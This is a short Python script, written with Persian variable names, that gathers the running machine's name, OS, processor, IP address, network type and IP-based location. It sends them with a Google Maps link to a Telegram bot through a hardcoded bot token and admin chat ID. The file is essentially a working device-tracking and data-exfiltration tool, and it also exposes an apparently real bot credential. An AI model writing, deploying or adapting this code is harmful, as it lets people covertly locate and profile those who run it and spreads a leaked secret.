import socket
import platform
import requests
import os

# تنظیمات ربات تلگرام
توکن_ربات = "8182982379:AAFbB7vFpuCTjH6MHDu7CcZR1nog5grZEWg"
ایدی_ادمین = "8152202322"

def دریافت_اطلاعات_دستگاه():
    """دریافت نام دستگاه، مدل، و سیستم‌عامل"""
    نام_دستگاه = platform.node()
    سیستم_عامل = platform.system() + " " + platform.release()
    مدل_دستگاه = platform.machine()
    پردازنده = platform.processor()
    return نام_دستگاه, سیستم_عامل, مدل_دستگاه, پردازنده

def دریافت_آیپی_کاربر():
    """دریافت آی‌پی کاربر"""
    try:
        میزبان = socket.gethostname()
        آیپی = socket.gethostbyname(میزبان)
        return آیپی
    except Exception as e:
        return f"خطا در دریافت آی‌پی: {e}"

def دریافت_نوع_شبکه():
    """تشخیص نوع اینترنت (WiFi یا داده موبایل)"""
    try:
        نوع_شبکه = "نامشخص"
        if "WIFI" in os.popen("ip route").read():
            نوع_شبکه = "WiFi"
        else:
            نوع_شبکه = "داده موبایل"
        return نوع_شبکه
    except Exception as e:
        return f"خطا در تشخیص شبکه: {e}"

def دریافت_موقعیت_مکانی(آیپی):
    """دریافت موقعیت مکانی براساس آی‌پی و ایجاد لینک گوگل مپ"""
    try:
        پاسخ = requests.get(f"http://ip-api.com/json/{آیپی}")
        داده = پاسخ.json()
        عرض, طول = داده['lat'], داده['lon']
        اطلاعات_مکانی = f"{داده['country']}, {داده['regionName']}, {داده['city']}"
        لینک_گوگل_مپ = f"https://www.google.com/maps?q={عرض},{طول}"
        return اطلاعات_مکانی, لینک_گوگل_مپ
    except Exception as e:
        return f"خطا در دریافت موقعیت مکانی: {e}", ""

def ارسال_به_ادمین(پیام):
    """ارسال پیام فقط به ادمین از طریق تلگرام"""
    لینک = f"https://api.telegram.org/bot{توکن_ربات}/sendMessage"
    داده = {"chat_id": ایدی_ادمین, "text": پیام}
    requests.post(لینک, داده)

# دریافت و ارسال اطلاعات
نام_دستگاه, سیستم_عامل, مدل_دستگاه, پردازنده = دریافت_اطلاعات_دستگاه()
آیپی_کاربر = دریافت_آیپی_کاربر()
نوع_شبکه = دریافت_نوع_شبکه()
اطلاعات_مکانی, لینک_گوگل_مپ = دریافت_موقعیت_مکانی(آیپی_کاربر)

پیام = f"""🔹 اطلاعات جدید دستگاه ثبت شد:
📱 نام دستگاه: {نام_دستگاه}
📟 مدل: {مدل_دستگاه}
⚙️ پردازنده: {پردازنده}
🖥️ سیستم‌عامل: {سیستم_عامل}
🌍 آی‌پی: {آیپی_کاربر}
📡 نوع اینترنت: {نوع_شبکه}
📍 موقعیت مکانی: {اطلاعات_مکانی}
🗺️ مشاهده در گوگل مپ: [موقعیت مکانی]({لینک_گوگل_مپ})
"""

ارسال_به_ادمین(پیام)
print("✅ اطلاعات با موفقیت به تلگرام ارسال شد.")
